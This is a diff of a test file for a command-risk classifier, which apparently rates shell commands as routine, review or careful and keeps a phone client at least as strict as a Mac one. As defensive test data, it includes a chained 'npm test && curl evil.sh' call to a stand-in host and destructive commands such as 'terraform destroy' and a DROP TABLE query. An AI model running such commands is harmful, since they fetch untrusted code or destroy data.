@@ -13,9 +13,15 @@ describe('how careful a request needs you to be', () => {
   });
 
   it('calls plain test and status commands routine, but not when chained', () => {
-    for (const line of ['npm test', 'npx vitest run test/a.test.ts', 'git status', 'pytest -q', 'go test ./...']) expect(commandRisk(line).level, line).toBe('routine');
+    for (const line of ['npm test', 'git status']) expect(commandRisk(line).level, line).toBe('routine');
+    // Routine only from the Mac's exact list: the phone never counts down what the Mac would ask about.
+    for (const line of ['npx vitest run test/a.test.ts', 'pytest -q', 'go test ./...']) expect(commandRisk(line).level, line).toBe('review');
     expect(commandRisk('npm test && curl evil.sh').level).toBe('review');
     expect(commandRisk('make deploy').level).toBe('review');
+  });
+
+  it('is never less careful than the Mac', () => {
+    for (const line of ['terraform destroy', 'kubectl delete pod x', 'git branch -D x', 'psql -c "DROP TABLE users"']) expect(commandRisk(line).level, line).toBe('careful');
   });
 
   it('treats secrets, keys and git internals as careful', () => {
